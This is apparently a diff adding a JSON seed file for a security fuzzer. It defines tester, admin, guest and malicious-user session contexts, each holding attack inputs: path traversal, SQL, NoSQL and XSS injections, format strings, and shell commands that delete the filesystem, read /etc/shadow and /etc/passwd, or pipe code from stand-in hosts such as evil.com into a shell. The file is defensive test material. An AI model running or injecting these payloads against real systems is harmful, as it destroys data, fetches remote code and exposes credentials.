@@ -1,0 +1,241 @@
+[
+  {
+    "id": "test_ctx_001",
+    "user": "test_user",
+    "role": "tester",
+    "permissions": {
+      "read": true,
+      "write": false,
+      "delete": false,
+      "admin": false
+    },
+    "context_type": "test_session",
+    "session_id": "test_sess_001",
+    "created_at": "2025-01-27T10:00:00Z",
+    "expires_at": "2025-01-27T11:00:00Z",
+    "security_constraints": {
+      "max_file_size": 1048576,
+      "allowed_paths": [
+        "/tmp/test"
+      ],
+      "blocked_paths": [
+        "/etc",
+        "/root"
+      ],
+      "network_access": false,
+      "rate_limit": {
+        "requests_per_minute": 30,
+        "burst_limit": 5
+      }
+    },
+    "test_data": {
+      "path_traversal": "../../../etc/passwd",
+      "command_injection": "$(rm -rf /)",
+      "xss_payload": "<script>alert('test')</script>",
+      "sql_injection": "'; DROP TABLE test; --",
+      "null_byte": "test\u0000hidden",
+      "unicode": "测试🚀",
+      "long_string": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    "metadata": {
+      "source": "fuzzer_test_seed",
+      "version": "1.0",
+      "test_case": "basic_security_test",
+      "description": "Basic test context for security fuzzing"
+    }
+  },
+  {
+    "id": "test_ctx_002",
+    "user": "admin",
+    "role": "administrator",
+    "permissions": {
+      "read": true,
+      "write": true,
+      "delete": true,
+      "admin": true
+    },
+    "context_type": "admin_session",
+    "session_id": "admin_sess_001",
+    "created_at": "2025-01-27T10:00:00Z",
+    "expires_at": "2025-01-27T23:59:59Z",
+    "security_constraints": {
+      "max_file_size": 1073741824,
+      "allowed_paths": [
+        "/*"
+      ],
+      "blocked_paths": [],
+      "network_access": true,
+      "rate_limit": {
+        "requests_per_minute": 1000,
+        "burst_limit": 100
+      }
+    },
+    "test_data": {
+      "path_traversal_advanced": "..%2f..%2f..%2fetc%2fpasswd",
+      "command_injection_complex": "$(cat /etc/shadow | base64)",
+      "xss_advanced": "<img src=x onerror=alert(document.cookie)>",
+      "sql_injection_blind": "1' AND SLEEP(5)--",
+      "null_byte_multiple": "test\u0000\u0001\u0002hidden",
+      "unicode_homograph": "аррӏе.com",
+      "buffer_overflow": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB-",
+      "format_string": "%s%s%s%s%s%n",
+      "template_injection": "{{7*7}}",
+      "deserialization": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
+    },
+    "metadata": {
+      "source": "fuzzer_test_seed",
+      "version": "2.0",
+      "test_case": "advanced_security_test",
+      "description": "Advanced security test context with comprehensive attack vectors"
+    }
+  },
+  {
+    "id": "test_ctx_003",
+    "user": "guest",
+    "role": "guest",
+    "permissions": {
+      "read": false,
+      "write": false,
+      "delete": false,
+      "admin": false
+    },
+    "context_type": "guest_session",
+    "session_id": "guest_sess_001",
+    "created_at": "2025-01-27T10:00:00Z",
+    "expires_at": "2025-01-27T10:30:00Z",
+    "security_constraints": {
+      "max_file_size": 1024,
+      "allowed_paths": [],
+      "blocked_paths": [
+        "/*"
+      ],
+      "network_access": false,
+      "rate_limit": {
+        "requests_per_minute": 1,
+        "burst_limit": 0
+      }
+    },
+    "test_data": {
+      "empty_strings": "",
+      "null_values": null,
+      "undefined_values": null,
+      "zero_values": 0,
+      "negative_values": -1,
+      "floating_point": 3.14159,
+      "special_chars": "!@#$%^&*()",
+      "whitespace_only": "   \n\t\r   ",
+      "very_long_path": "../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../file.txt",
+      "unicode_bidirectional": "العربية\u202e\u2066test\u2069",
+      "zero_width_chars": "test\u200b\u200c\u200d\ufeffdata"
+    },
+    "metadata": {
+      "source": "fuzzer_test_seed",
+      "version": "1.0",
+      "test_case": "minimal_permissions_test",
+      "description": "Test context with minimal permissions and edge case data"
+    }
+  },
+  {
+    "id": "test_ctx_004",
+    "user": "malicious_user",
+    "role": "user",
+    "permissions": {
+      "read": true,
+      "write": true,
+      "delete": false,
+      "admin": false
+    },
+    "context_type": "malicious_session",
+    "session_id": "mal_sess_001",
+    "created_at": "2025-01-27T10:00:00Z",
+    "expires_at": "2025-01-27T10:05:00Z",
+    "security_constraints": {
+      "max_file_size": 10485760,
+      "allowed_paths": [
+        "/tmp",
+        "/var/tmp"
+      ],
+      "blocked_paths": [
+        "/etc",
+        "/root",
+        "/home"
+      ],
+      "network_access": true,
+      "rate_limit": {
+        "requests_per_minute": 100,
+        "burst_limit": 10
+      }
+    },
+    "test_data": {
+      "malicious_commands": [
+        "$(curl -s http://malicious.com/shell | bash)",
+        "`wget -O- http://evil.com/payload | sh`",
+        "eval('rm -rf /')",
+        "require('child_process').exec('cat /etc/passwd')",
+        "python -c \"import os; os.system('rm -rf /')\"",
+        "node -e \"require('fs').unlinkSync('/etc/passwd')\"",
+        "php -r \"system('rm -rf /');\""
+      ],
+      "malicious_paths": [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "/proc/self/environ",
+        "/proc/self/cmdline",
+        "/sys/class/net/eth0/address",
+        "\\\\evil\\share\\malware.exe",
+        "file:///etc/passwd",
+        "php://filter/convert.base64-encode/resource=/etc/passwd"
+      ],
+      "malicious_injections": {
+        "sql": [
+          "'; DROP TABLE users; --",
+          "' OR 1=1 --",
+          "' UNION SELECT * FROM information_schema.tables --",
+          "admin'--",
+          "' OR '1'='1"
+        ],
+        "nosql": [
+          "{\"$gt\": \"\"}",
+          "{\"$where\": \"sleep(5000)\"}",
+          "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
+        ],
+        "xss": [
+          "<script>alert(document.cookie)</script>",
+          "<img src=x onerror=alert(1)>",
+          "javascript:alert(document.domain)",
+          "'><script>alert(1)</script>",
+          "\"><script>alert(1)</script>"
+        ]
+      },
+      "malicious_files": [
+        "exploit.sh",
+        "payload.php",
+        "malware.exe",
+        "backdoor.py",
+        "trojan.js",
+        "virus.bat"
+      ],
+      "encoded_payloads": [
+        "dGVzdA==",
+        "%74%65%73%74",
+        "\\x74\\x65\\x73\\x74",
+        "\\u0074\\u0065\\u0073\\u0074"
+      ]
+    },
+    "metadata": {
+      "source": "fuzzer_test_seed",
+      "version": "3.0",
+      "test_case": "comprehensive_malicious_test",
+      "description": "Comprehensive malicious test context with real-world attack patterns",
+      "security_test": true,
+      "attack_categories": [
+        "command_injection",
+        "path_traversal",
+        "sql_injection",
+        "xss",
+        "file_upload",
+        "encoding_attacks"
+      ]
+    }
+  }
+]
